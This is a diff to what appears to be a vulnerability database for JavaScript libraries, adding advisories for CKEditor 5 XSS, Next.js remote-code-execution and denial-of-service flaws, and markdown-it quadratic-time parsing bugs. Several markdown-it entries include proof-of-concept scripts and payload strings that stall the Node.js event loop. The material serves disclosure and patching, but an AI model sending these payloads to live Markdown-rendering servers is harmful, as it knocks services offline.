+            "https://github.com/ckeditor/ckeditor5/releases/tag/v48.5.1"
+          ]
+        },
+        {
+          "atOrAbove": "48.0.0",
+          "below": "48.5.1",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "CKEditor: Cross-site scripting (XSS) in the engine package",
+            "githubID": "GHSA-rh54-vffm-5fvp",
+            "CVE": [
+              "CVE-2026-116688"
+            ]
+          },
+          "details": "### Impact\nA Cross-Site Scripting (XSS) vulnerability has been discovered in the CKEditor 5 engine. This vulnerability is caused by a prototype pollution issue in the `es-toolkit` library used in the CKEditor 5 codebase. This vulnerability could lead to unauthorized JavaScript code execution when the editor processes incoming `style` attribute values.\n\nThe underlying issue has been patched by the library maintainers, and the fix has been incorporated into CKEditor 5.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version `48.5.1` (and above) and `47.7.4` (LTS).\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.",
+          "info": [
+            "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-rh54-vffm-5fvp",
+            "https://github.com/ckeditor/ckeditor5/commit/4d9c5bb34f63cd956d15ccafbe584e14280c86a0",
+            "https://github.com/ckeditor/ckeditor5/commit/a750e38635db6a18c5b11599c09f4fd702850423",
+            "https://github.com/ckeditor/ckeditor5/releases/tag/v47.7.4",
+            "https://github.com/ckeditor/ckeditor5/releases/tag/v48.5.1"
+          ]
+        },
+        {
+          "atOrAbove": "48.0.0",
+          "below": "48.5.1",
+          "severity": "low",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "CKEditor: Cross-site scripting (XSS) in the engine package",
+            "githubID": "GHSA-v6mg-96c6-gmpq",
+            "CVE": [
+              "CVE-2026-116687"
+            ]
+          },
+          "details": "### Impact\nA Cross-Site Scripting (XSS) vulnerability has been discovered in the CKEditor 5 engine. This vulnerability could be triggered by inserting specially crafted markup under a specific General HTML Support configuration that allows inserting objects, leading to unauthorized JavaScript code execution in a browser context isolated from the origin of the application embedding the editor.\n\nThis vulnerability affects only installations where General HTML Support is enabled and configured to allow the affected HTML content.\n\n### Patches\nThe problem has been recognized and patched. The fix will be available in version `48.5.1` (and above) and `47.7.4` (LTS).\n\n### For more information\nEmail us at [security@cksource.com](mailto:security@cksource.com) if you have any questions or comments about this advisory.",
+          "info": [
+            "https://github.com/ckeditor/ckeditor5/security/advisories/GHSA-v6mg-96c6-gmpq",
+            "https://github.com/ckeditor/ckeditor5/commit/4d9c5bb34f63cd956d15ccafbe584e14280c86a0",
+            "https://github.com/ckeditor/ckeditor5/commit/a750e38635db6a18c5b11599c09f4fd702850423",
+            "https://github.com/ckeditor/ckeditor5/releases/tag/v47.7.4",
+            "https://github.com/ckeditor/ckeditor5/releases/tag/v48.5.1"
           ]
         }
       ],
@@ -10309,6 +10588,79 @@
           ]
         },
         {
+          "atOrAbove": "0",
+          "below": "14.3.2",
+          "severity": "high",
+          "cwe": [
+            "CWE-400",
+            "CWE-407"
+          ],
+          "identifiers": {
+            "summary": "markdown-it: Quadratic complexity in smartquotes with unmatched closing quotes",
+            "githubID": "GHSA-r7fv-28h4-cvq7",
+            "CVE": [
+              "CVE-2026-111759"
+            ]
+          },
+          "details": "### Impact\n\nWhen `typographer: true` is enabled, specially crafted Markdown can cause quadratic processing time in the smartquotes rule, potentially leading to denial of service in applications processing untrusted input.\n\nMany opening double quotes followed by unmatched closing single quotes cause repeated scans of the entire opener stack. The same issue occurs with the quote types reversed.\n\nThe default configuration (`typographer: false`) is not affected, but this option is enabled with high probability.\n\n### Reproduction\n\n```js\nimport MarkdownIt from 'markdown-it'\nimport { performance } from 'node:perf_hooks'\n\nconst md = new MarkdownIt({ typographer: true })\n\nfor (const k of [2000, 4000, 8000, 16000, 32000]) {\n  const input = '\"a '.repeat(k) + \"b' \".repeat(k)\n  const start = performance.now()\n  md.render(input)\n  console.log(input.length, (performance.now() - start).toFixed(1), 'ms')\n}\n```\n\nResult:\n\n|input size|time|\n|-|-|\n|12000|18ms|\n|24000|47ms|\n|48000|115ms|\n|96000|428ms|\n|192000|1586ms|\n\n### Patches\n\nFixed in **15.0.2** and **14.3.2**.\n\n### Workarounds\n\nDisable typography with `typographer: false`, or disable only the smartquotes rule:\n\n```js\nmd.disable('smartquotes')\n```",
+          "info": [
+            "https://github.com/markdown-it/markdown-it/security/advisories/GHSA-r7fv-28h4-cvq7",
+            "https://github.com/markdown-it/markdown-it/commit/1b379c1b6d0522421bd1a51b77337c79af2c8670",
+            "https://github.com/markdown-it/markdown-it/commit/cf27366035edf9196667110c47d9d67b030a4152",
+            "https://github.com/markdown-it/markdown-it/commit/daf5a3c32303e5d9de01b12eeb725fb5990b8162",
+            "https://github.com/markdown-it/markdown-it/releases/tag/14.3.2",
+            "https://github.com/markdown-it/markdown-it/releases/tag/15.0.2"
+          ]
+        },
+        {
+          "atOrAbove": "0",
+          "below": "14.3.3",
+          "severity": "low",
+          "cwe": [
+            "CWE-400",
+            "CWE-407"
+          ],
+          "identifiers": {
+            "summary": "markdown-it: Quadratic-time denial of service in inline HTML parsing with html enabled",
+            "githubID": "GHSA-vfgh-jcmw-g37q",
+            "CVE": [
+              "CVE-2026-111766"
+            ]
+          },
+          "details": "### Summary\n\nWith `html: true`, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (`<!--`), processing instructions (`<?`), declarations (`<!A`), and CDATA sections (`<![CDATA[`).\n\nAn attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the `commonmark` preset enables it.\n\nThe issue was reported against the published `markdown-it@15.0.2` package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.\n\n### Details\n\n`src/rules_inline/text.ts` treats `<` as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.\n\nWith HTML enabled, `src/rules_inline/html_inline.ts` applies an anchored regular expression to the remaining input:\n\n```js\nconst match = state.src.slice(pos).match(HTML_TAG_RE)\n```\n\nThe comment, processing instruction, declaration, and CDATA alternatives in `src/common/html_re.ts` scan the remaining input for their respective terminators: `-->`, `?>`, `>`, and `]]>`.\n\nWhen the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.\n\nThe payload must reach inline parsing. Prefixing it with `x ` keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.\n\nThe existing `unclosed <!--` test in `test/markdown-it/pathological.test.mjs` already contains a reproducer:\n\n```js\n'</' + '<!--'.repeat(100000)\n```\n\nHowever, it runs with default options, where HTML is disabled.\n\nA fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by caching failed searches on the inline state. Fixing only the comment alternative leaves the other three cases affected. Regression coverage should exercise all four with `html: true`.\n\nThe original report was submitted by [@JarLob](https://github.com/JarLob). It credits the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) as part of the [GitHub Secure Open Source Fund](https://github.com/open-source/github-secure-open-source-fund).\n\n### Proof of concept\n\nInstall the affected package in an empty directory:\n\n```sh\nnpm install markdown-it@15.0.2\n```\n\nSave the following as `poc.mjs` and run `node poc.mjs`:\n\n```js\nimport MarkdownIt from 'markdown-it'\nimport { performance } from 'node:perf_hooks'\n\nconst mdHtml = new MarkdownIt({ html: true })\nconst mdDefault = new MarkdownIt()\nconst sizes = [8000, 16000, 32000, 64000]\n\nfunction measure(md, src) {\n  const start = performance.now()\n  md.render(src)\n  return (performance.now() - start).toFixed(1)\n}\n\nconst variants = {\n  comment: '<!--',\n  processing: '<?x',\n  declaration: '<!A',\n  cdata: '<![CDATA['\n}\n\nfor (const [name, opener] of Object.entries(variants)) {\n  console.log(`\\n${name}`)\n  for (const n of sizes) {\n    const src = 'x ' + opener.repeat(n)\n    console.log({\n      n,\n      bytes: Buffer.byteLength(src),\n      ms: measure(mdHtml, src)\n    })\n  }\n}\n\nconst n = sizes.at(-1)\nconst controls = {\n  'HTML disabled': [mdDefault, 'x ' + '<!--'.repeat(n)],\n  'Closed comments': [mdHtml, 'x ' + '<!---->'.repeat(n)],\n  'HTML block': [mdHtml, '<!--'.repeat(n)],\n  'Plain text': [mdHtml, 'x ' + 'abcd'.repeat(n)]\n}\n\nfor (const [name, [md, src]] of Object.entries(controls)) {\n  console.log({ control: name, ms: measure(md, src) })\n}\n\nconst repoPayload = '</' + '<!--'.repeat(100000)\nconsole.log({\n  payload: 'Existing pathological test',\n  htmlFalseMs: measure(mdDefault, repoPayload),\n  htmlTrueMs: measure(mdHtml, repoPayload)\n})\n```\n\nMeasurements from the original report on `markdown-it@15.0.2`, Node.js 20:\n\n| Construct | 8,000 repetitions | 64,000 repetitions |\n| --- | ---: | ---: |\n| Comment | 170 ms | 8,799 ms |\n| Processing instruction | 26 ms | 1,566 ms |\n| Declaration | 93 ms | 5,628 ms |\n| CDATA | 119 ms | 4,179 ms |\n\nAn eightfold increase in repetitions produces approximately 35–60 times the execution time, consistent with quadratic growth becoming dominant.\n\nFor the comment payload at 64,000 repetitions:\n\n- HTML disabled: 25 ms.\n- Closed comments: 29 ms.\n- Payload at the start of an HTML block: 1 ms.\n- Plain text: 1 ms.\n\nThe existing pathological-test payload with 100,000 comment openers took 33 ms with HTML disabled and 21,030 ms with HTML enabled. A separate comment payload with 128,000 repetitions, approximately 500 KiB, took 32,847 ms.\n\nExact timings depend on the runtime and hardware.\n\n### Impact\n\nThis is an availability issue affecting applications that render attacker-controlled Markdown with `html: true`, including applications using the `commonmark` preset.\n\nOn Node.js, a synchronous `render()` call can occupy a CPU core and block the event loop for seconds or tens of seconds, delaying other requests handled by the same process. Repeated submissions can cause denial of service. Browser applications can similarly become unresponsive when rendering on the main thread.\n\nSanitizing the generated HTML afterwards does not prevent the issue because the expensive processing occurs during Markdown rendering.\n\nThe default configuration, with HTML disabled, is unaffected by these payloads. Disabling HTML or limiting input size can reduce exposure while a fix is prepared.\n\nThe reported affected release is `15.0.2`; the full affected version range has not been established.",
+          "info": [
+            "https://github.com/markdown-it/markdown-it/security/advisories/GHSA-vfgh-jcmw-g37q",
+            "https://github.com/markdown-it/markdown-it/commit/928bc8c11ded60181c0e7fc5aa954eec582e8e79",
+            "https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503",
+            "https://github.com/markdown-it/markdown-it/releases/tag/14.3.3",
+            "https://github.com/markdown-it/markdown-it/releases/tag/15.0.3"
+          ]
+        },
+        {
+          "atOrAbove": "14.1.0",
+          "below": "14.3.3",
+          "severity": "high",
+          "cwe": [
+            "CWE-400",
+            "CWE-407"
+          ],
+          "identifiers": {
+            "summary": "markdown-it: Quadratic-time rendering of a single multi-line link reference definition with default options (regression since 14.0)",
+            "githubID": "GHSA-gfr2-rv44-r23c",
+            "CVE": [
+              "CVE-2026-111758"
+            ]
+          },
+          "details": "### Summary\n\nA link reference definition whose label or title is never closed is O(n²) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4–5× per doubling. No options are required to trigger it.\n\n### Details\n\nsrc/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n²). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark §6.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.\n\nThe observed output from PoC was:\nunclosed title n=100000   200009 B    3585.5 ms\nunclosed title n=200000   400009 B   18107.1 ms   (5.05x)\nunclosed title n=400000   800009 B   73954.4 ms   (4.08x)\n\nRegression comparison at 313 KB: 13.0.2 → 125 ms, 14.1.0 → 11.4 s, 15.0.0 → 10.6 s, 15.0.2 → 10.7 s.\n\n### Proof of concept\n\nHow to execute the PoC:\n1. mkdir -p markdown-it-poc && cd markdown-it-poc\n2. npm init -y\n3. npm i markdown-it@15.0.2\n4. node poc_markdown_it.js\n\nPoC below is:\n```javascript\n// poc_markdown_it.js\n// Requires: npm install markdown-it@15.0.2\nconst MarkdownIt = require('markdown-it');\nconst md = new MarkdownIt();\n\nfunction bench(label, src) {\n  const t0 = process.hrtime.bigint();\n  md.render(src);\n  const t1 = process.hrtime.bigint();\n  console.log(\n    `${label.padEnd(30)} ${String(src.length).padStart(9)} B ${(Number(t1 - t0) / 1e6).toFixed(1).padStart(9)} ms`\n  );\n}\n\n// Unclosed title: one reference definition spread over many lines\nfor (const n of [100000, 200000, 400000]) {\n  bench(`unclosed title n=${n}`, '[a]: /u \"' + 'x\\n'.repeat(n));\n}\n\n// Unclosed label\nfor (const n of [5000, 10000, 20000]) {\n  bench(`unclosed label n=${n}`, '[' + 'a\\n'.repeat(n));\n}\n```\n\n### Impact\n\nThis is an algorithmic-complexity denial of service (CWE-407). Any server that renders user Markdown with markdown-it is affected with default options, including comments, issues, chat, wikis, docs previews, and LLM chat UIs. A ~400 KB request body blocks the Node.js event loop for about 18 seconds and an ~800 KB body for about 74 seconds. This is the same class and attacker model as GHSA-253c, but it is reachable without any opt-in option, since the affected path is a core block rule.",
+          "info": [
+            "https://github.com/markdown-it/markdown-it/security/advisories/GHSA-gfr2-rv44-r23c",
+            "https://github.com/markdown-it/markdown-it/commit/48fbc465812c440020c663f040ab22deaf8f1eca",
+            "https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503",
+            "https://github.com/markdown-it/markdown-it/releases/tag/14.3.3",
+            "https://github.com/markdown-it/markdown-it/releases/tag/15.0.3"
+          ]
+        },
+        {
           "atOrAbove": "15.0.0",
           "below": "15.0.1",
           "severity": "medium",
@@ -10326,6 +10678,79 @@
             "https://github.com/markdown-it/markdown-it/commit/09fa07118dda4c953f058848f53dae88395618ca",
             "https://github.com/markdown-it/markdown-it/commit/aaadcfa6d817b3c5f89afb49d97c7b797a6dd4fd",
             "https://github.com/markdown-it/markdown-it/commit/ad70f6b7cff64bee10e42a774147112480ca0d49"
+          ]
+        },
+        {
+          "atOrAbove": "15.0.0",
+          "below": "15.0.2",
+          "severity": "high",
+          "cwe": [
+            "CWE-400",
+            "CWE-407"
+          ],
+          "identifiers": {
+            "summary": "markdown-it: Quadratic complexity in smartquotes with unmatched closing quotes",
+            "githubID": "GHSA-r7fv-28h4-cvq7",
+            "CVE": [
+              "CVE-2026-111759"
+            ]
+          },
+          "details": "### Impact\n\nWhen `typographer: true` is enabled, specially crafted Markdown can cause quadratic processing time in the smartquotes rule, potentially leading to denial of service in applications processing untrusted input.\n\nMany opening double quotes followed by unmatched closing single quotes cause repeated scans of the entire opener stack. The same issue occurs with the quote types reversed.\n\nThe default configuration (`typographer: false`) is not affected, but this option is enabled with high probability.\n\n### Reproduction\n\n```js\nimport MarkdownIt from 'markdown-it'\nimport { performance } from 'node:perf_hooks'\n\nconst md = new MarkdownIt({ typographer: true })\n\nfor (const k of [2000, 4000, 8000, 16000, 32000]) {\n  const input = '\"a '.repeat(k) + \"b' \".repeat(k)\n  const start = performance.now()\n  md.render(input)\n  console.log(input.length, (performance.now() - start).toFixed(1), 'ms')\n}\n```\n\nResult:\n\n|input size|time|\n|-|-|\n|12000|18ms|\n|24000|47ms|\n|48000|115ms|\n|96000|428ms|\n|192000|1586ms|\n\n### Patches\n\nFixed in **15.0.2** and **14.3.2**.\n\n### Workarounds\n\nDisable typography with `typographer: false`, or disable only the smartquotes rule:\n\n```js\nmd.disable('smartquotes')\n```",
+          "info": [
+            "https://github.com/markdown-it/markdown-it/security/advisories/GHSA-r7fv-28h4-cvq7",
+            "https://github.com/markdown-it/markdown-it/commit/1b379c1b6d0522421bd1a51b77337c79af2c8670",
+            "https://github.com/markdown-it/markdown-it/commit/cf27366035edf9196667110c47d9d67b030a4152",
+            "https://github.com/markdown-it/markdown-it/commit/daf5a3c32303e5d9de01b12eeb725fb5990b8162",
+            "https://github.com/markdown-it/markdown-it/releases/tag/14.3.2",
+            "https://github.com/markdown-it/markdown-it/releases/tag/15.0.2"
+          ]
+        },
+        {
+          "atOrAbove": "15.0.0",
+          "below": "15.0.3",
+          "severity": "high",
+          "cwe": [
+            "CWE-400",
+            "CWE-407"
+          ],
+          "identifiers": {
+            "summary": "markdown-it: Quadratic-time rendering of a single multi-line link reference definition with default options (regression since 14.0)",
+            "githubID": "GHSA-gfr2-rv44-r23c",
+            "CVE": [
+              "CVE-2026-111758"
+            ]
+          },
+          "details": "### Summary\n\nA link reference definition whose label or title is never closed is O(n²) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4–5× per doubling. No options are required to trigger it.\n\n### Details\n\nsrc/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n²). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark §6.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.\n\nThe observed output from PoC was:\nunclosed title n=100000   200009 B    3585.5 ms\nunclosed title n=200000   400009 B   18107.1 ms   (5.05x)\nunclosed title n=400000   800009 B   73954.4 ms   (4.08x)\n\nRegression comparison at 313 KB: 13.0.2 → 125 ms, 14.1.0 → 11.4 s, 15.0.0 → 10.6 s, 15.0.2 → 10.7 s.\n\n### Proof of concept\n\nHow to execute the PoC:\n1. mkdir -p markdown-it-poc && cd markdown-it-poc\n2. npm init -y\n3. npm i markdown-it@15.0.2\n4. node poc_markdown_it.js\n\nPoC below is:\n```javascript\n// poc_markdown_it.js\n// Requires: npm install markdown-it@15.0.2\nconst MarkdownIt = require('markdown-it');\nconst md = new MarkdownIt();\n\nfunction bench(label, src) {\n  const t0 = process.hrtime.bigint();\n  md.render(src);\n  const t1 = process.hrtime.bigint();\n  console.log(\n    `${label.padEnd(30)} ${String(src.length).padStart(9)} B ${(Number(t1 - t0) / 1e6).toFixed(1).padStart(9)} ms`\n  );\n}\n\n// Unclosed title: one reference definition spread over many lines\nfor (const n of [100000, 200000, 400000]) {\n  bench(`unclosed title n=${n}`, '[a]: /u \"' + 'x\\n'.repeat(n));\n}\n\n// Unclosed label\nfor (const n of [5000, 10000, 20000]) {\n  bench(`unclosed label n=${n}`, '[' + 'a\\n'.repeat(n));\n}\n```\n\n### Impact\n\nThis is an algorithmic-complexity denial of service (CWE-407). Any server that renders user Markdown with markdown-it is affected with default options, including comments, issues, chat, wikis, docs previews, and LLM chat UIs. A ~400 KB request body blocks the Node.js event loop for about 18 seconds and an ~800 KB body for about 74 seconds. This is the same class and attacker model as GHSA-253c, but it is reachable without any opt-in option, since the affected path is a core block rule.",
+          "info": [
+            "https://github.com/markdown-it/markdown-it/security/advisories/GHSA-gfr2-rv44-r23c",
+            "https://github.com/markdown-it/markdown-it/commit/48fbc465812c440020c663f040ab22deaf8f1eca",
+            "https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503",
+            "https://github.com/markdown-it/markdown-it/releases/tag/14.3.3",
+            "https://github.com/markdown-it/markdown-it/releases/tag/15.0.3"
+          ]
+        },
+        {
+          "atOrAbove": "15.0.0",
+          "below": "15.0.3",
+          "severity": "low",
+          "cwe": [
+            "CWE-400",
+            "CWE-407"
+          ],
+          "identifiers": {
+            "summary": "markdown-it: Quadratic-time denial of service in inline HTML parsing with html enabled",
+            "githubID": "GHSA-vfgh-jcmw-g37q",
+            "CVE": [
+              "CVE-2026-111766"
+            ]
+          },
+          "details": "### Summary\n\nWith `html: true`, markdown-it takes quadratic time to parse repeated unterminated HTML constructs inside a paragraph. This affects HTML comments (`<!--`), processing instructions (`<?`), declarations (`<!A`), and CDATA sections (`<![CDATA[`).\n\nAn attacker-controlled input of a few hundred kilobytes can block the Node.js event loop for seconds or tens of seconds. The default configuration has HTML disabled, but the `commonmark` preset enables it.\n\nThe issue was reported against the published `markdown-it@15.0.2` package on Node.js 20 and reproduced on the current source with Node.js 24.16.0.\n\n### Details\n\n`src/rules_inline/text.ts` treats `<` as a terminator, causing the inline parser to attempt the HTML rule at successive HTML construct openers.\n\nWith HTML enabled, `src/rules_inline/html_inline.ts` applies an anchored regular expression to the remaining input:\n\n```js\nconst match = state.src.slice(pos).match(HTML_TAG_RE)\n```\n\nThe comment, processing instruction, declaration, and CDATA alternatives in `src/common/html_re.ts` scan the remaining input for their respective terminators: `-->`, `?>`, `>`, and `]]>`.\n\nWhen the terminator is absent, matching fails. Parsing eventually reaches the next opener and scans an overlapping suffix again. Repeating this across the paragraph produces quadratic total work. For these inputs, the problem is repeated scanning across separate matches.\n\nThe payload must reach inline parsing. Prefixing it with `x ` keeps it inside a paragraph. Starting a line directly with one of these constructs instead invokes HTML block parsing, which does not exhibit the same repeated inline scans for these payloads.\n\nThe existing `unclosed <!--` test in `test/markdown-it/pathological.test.mjs` already contains a reproducer:\n\n```js\n'</' + '<!--'.repeat(100000)\n```\n\nHowever, it runs with default options, where HTML is disabled.\n\nA fix should avoid repeated searches for absent terminators across all four affected alternatives, for example by caching failed searches on the inline state. Fixing only the comment alternative leaves the other three cases affected. Regression coverage should exercise all four with `html: true`.\n\nThe original report was submitted by [@JarLob](https://github.com/JarLob). It credits the [GitHub Security Lab Taskflow Agent](https://github.com/GitHubSecurityLab/seclab-taskflow-agent) as part of the [GitHub Secure Open Source Fund](https://github.com/open-source/github-secure-open-source-fund).\n\n### Proof of concept\n\nInstall the affected package in an empty directory:\n\n```sh\nnpm install markdown-it@15.0.2\n```\n\nSave the following as `poc.mjs` and run `node poc.mjs`:\n\n```js\nimport MarkdownIt from 'markdown-it'\nimport { performance } from 'node:perf_hooks'\n\nconst mdHtml = new MarkdownIt({ html: true })\nconst mdDefault = new MarkdownIt()\nconst sizes = [8000, 16000, 32000, 64000]\n\nfunction measure(md, src) {\n  const start = performance.now()\n  md.render(src)\n  return (performance.now() - start).toFixed(1)\n}\n\nconst variants = {\n  comment: '<!--',\n  processing: '<?x',\n  declaration: '<!A',\n  cdata: '<![CDATA['\n}\n\nfor (const [name, opener] of Object.entries(variants)) {\n  console.log(`\\n${name}`)\n  for (const n of sizes) {\n    const src = 'x ' + opener.repeat(n)\n    console.log({\n      n,\n      bytes: Buffer.byteLength(src),\n      ms: measure(mdHtml, src)\n    })\n  }\n}\n\nconst n = sizes.at(-1)\nconst controls = {\n  'HTML disabled': [mdDefault, 'x ' + '<!--'.repeat(n)],\n  'Closed comments': [mdHtml, 'x ' + '<!---->'.repeat(n)],\n  'HTML block': [mdHtml, '<!--'.repeat(n)],\n  'Plain text': [mdHtml, 'x ' + 'abcd'.repeat(n)]\n}\n\nfor (const [name, [md, src]] of Object.entries(controls)) {\n  console.log({ control: name, ms: measure(md, src) })\n}\n\nconst repoPayload = '</' + '<!--'.repeat(100000)\nconsole.log({\n  payload: 'Existing pathological test',\n  htmlFalseMs: measure(mdDefault, repoPayload),\n  htmlTrueMs: measure(mdHtml, repoPayload)\n})\n```\n\nMeasurements from the original report on `markdown-it@15.0.2`, Node.js 20:\n\n| Construct | 8,000 repetitions | 64,000 repetitions |\n| --- | ---: | ---: |\n| Comment | 170 ms | 8,799 ms |\n| Processing instruction | 26 ms | 1,566 ms |\n| Declaration | 93 ms | 5,628 ms |\n| CDATA | 119 ms | 4,179 ms |\n\nAn eightfold increase in repetitions produces approximately 35–60 times the execution time, consistent with quadratic growth becoming dominant.\n\nFor the comment payload at 64,000 repetitions:\n\n- HTML disabled: 25 ms.\n- Closed comments: 29 ms.\n- Payload at the start of an HTML block: 1 ms.\n- Plain text: 1 ms.\n\nThe existing pathological-test payload with 100,000 comment openers took 33 ms with HTML disabled and 21,030 ms with HTML enabled. A separate comment payload with 128,000 repetitions, approximately 500 KiB, took 32,847 ms.\n\nExact timings depend on the runtime and hardware.\n\n### Impact\n\nThis is an availability issue affecting applications that render attacker-controlled Markdown with `html: true`, including applications using the `commonmark` preset.\n\nOn Node.js, a synchronous `render()` call can occupy a CPU core and block the event loop for seconds or tens of seconds, delaying other requests handled by the same process. Repeated submissions can cause denial of service. Browser applications can similarly become unresponsive when rendering on the main thread.\n\nSanitizing the generated HTML afterwards does not prevent the issue because the expensive processing occurs during Markdown rendering.\n\nThe default configuration, with HTML disabled, is unaffected by these payloads. Disabling HTML or limiting input size can reduce exposure while a fix is prepared.\n\nThe reported affected release is `15.0.2`; the full affected version range has not been established.",
+          "info": [
+            "https://github.com/markdown-it/markdown-it/security/advisories/GHSA-vfgh-jcmw-g37q",
+            "https://github.com/markdown-it/markdown-it/commit/928bc8c11ded60181c0e7fc5aa954eec582e8e79",
+            "https://github.com/markdown-it/markdown-it/commit/d99f48839d37af6fd8a2617516c43dab90755503",
+            "https://github.com/markdown-it/markdown-it/releases/tag/14.3.3",
+            "https://github.com/markdown-it/markdown-it/releases/tag/15.0.3"
           ]
         }
       ],
@@ -13098,6 +13523,47 @@
           ]
         },
         {
+          "atOrAbove": "10.0.0",
+          "below": "15.5.28",
+          "severity": "critical",
+          "cwe": [
+            "CWE-1395"
+          ],
+          "identifiers": {
+            "summary": "Next.js: Unauthenticated Remote Code Execution in Image Optimization API when SVG files are used",
+            "githubID": "GHSA-2464-fhr4-w9xw"
+          },
+          "details": "## Impact\n\nA memory-related vulnerability has been discovered in an upstream library used for Image Optimization can lead to possible remote code execution (RCE) when Next.js runs on glibc-based Linux.\n\n## Workaround\n\nEnsure the version of `sharp` used by Next.js is greater than or equal to `0.35.5`. Fresh installs automatically get a fixed version of `sharp`.\nUpgrading Next.js to the patched versions will ensure package managers automatically provide a fixed version of `sharp` to Next.js.",
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-2464-fhr4-w9xw",
+            "https://github.com/vercel/next.js/commit/5e3b687b5edb868b064bdc058d768a7021e7f6ad",
+            "https://github.com/vercel/next.js/commit/9571ec899f063df6533351bec390ccb2cc0af6a3",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+            "https://github.com/vercel/next.js/releases/tag/v16.4.1"
+          ]
+        },
+        {
+          "atOrAbove": "13.0.0",
+          "below": "15.5.28",
+          "severity": "high",
+          "cwe": [
+            "CWE-770"
+          ],
+          "identifiers": {
+            "summary": "Next.js: Denial of Service in App Router using Server Actions",
+            "githubID": "GHSA-p3m5-59mp-jv5r",
+            "CVE": [
+              "CVE-2026-94482"
+            ]
+          },
+          "details": "## Impact\n\nCrafted requests targeting Next.js applications using App Router with at least one Server Action can lead to excessive CPU usage blocking processing of further requests in the same process.\n\n## Workarounds\n\nNo workaround exists besides upgrading. Applications using Pages Router or not using Server Actions are not vulnerable.",
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-p3m5-59mp-jv5r",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+            "https://github.com/vercel/next.js/releases/tag/v16.4.1"
+          ]
+        },
+        {
           "atOrAbove": "15.6.0-canary.0",
           "below": "15.6.0-canary.59",
           "severity": "high",
@@ -14219,6 +14685,86 @@
             "https://github.com/vercel/next.js/commit/bd9214f9a32854a011bf5fe58e481dffe1bbf598",
             "https://github.com/vercel/next.js/releases/tag/v16.3.8"
           ]
+        },
+        {
+          "atOrAbove": "16.3.0",
+          "below": "16.3.8",
+          "severity": "medium",
+          "cwe": [
+            "CWE-524"
+          ],
+          "identifiers": {
+            "summary": "next.js cache leak across root param values in nested 'use cache' functions",
+            "githubID": "GHSA-h694-7cp9-m8p3",
+            "CVE": [
+              "CVE-2026-103004"
+            ]
+          },
+          "details": "### Impact\n\nWith Cache Components enabled (`cacheComponents: true`), a `'use cache'` function that calls another `'use cache'` function that reads a root param can be keyed incorrectly when the inner call is served from an existing entry: the enclosing function's cache key then omits that root param. The enclosing entry is written once and reused for all root param values, so a response for one root param value can serve content produced for a different value — whether the page is prerendered at build time or at runtime, or rendered dynamically. Shared cache headers let downstream caches redistribute the content further. \n\nWhat values are leaked cannot be attacker controlled. Which value's content is served depends only on which invocation wrote the entry first.\n\n### Workarounds\n\nThere are no known workarounds. Apps should upgrade to the patched version as soon as possible.",
+          "info": [
